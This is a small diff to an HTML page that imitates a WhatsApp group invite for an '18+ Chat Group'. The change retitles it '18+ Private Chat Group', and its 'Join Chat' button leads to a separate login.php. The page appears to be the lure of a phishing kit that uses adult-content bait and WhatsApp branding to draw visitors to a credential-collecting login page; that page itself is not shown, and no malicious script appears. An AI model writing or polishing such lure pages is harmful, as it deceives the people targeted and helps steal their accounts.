@@ -46,7 +46,7 @@
 		<div class="page-content page-content--single">
 			<div class="block block--invite">
 				<a href="#" id="action-icon" title="Follow this link to join: Berbagi Video 18+ Hot" class="block__img img icon-chat"><span class="img__body" style="background-image: url(img/1.png);"></span></a>
-				<h2 class="block__title">18+ Chat Group<h2>
+				<h2 class="block__title">18+ Private Chat Group<h2>
 				<h3 class="block__subtitle" dir="auto">WhatsApp Group Invite</h3>
 				<button onclick="location.href='login.php';" type="button" class="button button--simple button--primary">Join Chat</button>
 			</div>
